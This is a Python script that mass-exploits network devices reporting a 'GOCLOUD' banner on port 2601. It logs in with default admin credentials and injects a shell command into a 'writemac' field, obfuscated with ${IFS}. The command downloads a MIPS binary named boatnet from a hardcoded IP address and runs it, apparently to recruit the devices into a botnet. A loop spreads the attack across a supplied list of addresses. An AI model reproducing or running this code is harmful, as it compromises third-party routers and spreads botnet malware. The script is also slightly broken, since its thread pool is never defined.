import socket, time, sys
from multiprocessing.pool import ThreadPool

cmd = "cd${IFS}/tmp/;${IFS}rm${IFS}mipsel;${IFS}wget${IFS}http://84.200.81.239/hiddenbin/boatnet.mips;${IFS}chmod${IFS}777${IFS}boatnet.mips;${IFS}./boatnet.mips${IFS}mips"
sequence = ['admin\n','admin\n', '\n', f'writemac ;{cmd};\n']

def exploit(ip):
  try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, 2601))
    data = s.recv(8096)
    if 'GOCLOUD' in str(data):
      time.sleep(1)
      for seq in sequence:
        s.send(bytes(seq, 'utf-8'))
  except Exception as e:
    print(f"Borked in exploit(): {e}")

if len(sys.argv) != 2:
  print(f"Usage: python3 {sys.argv[0]} iplist.txt")
  exit()

ips = [line.rstrip('\n') for line in open(sys.argv[1])]
pool.map(exploit,ips)
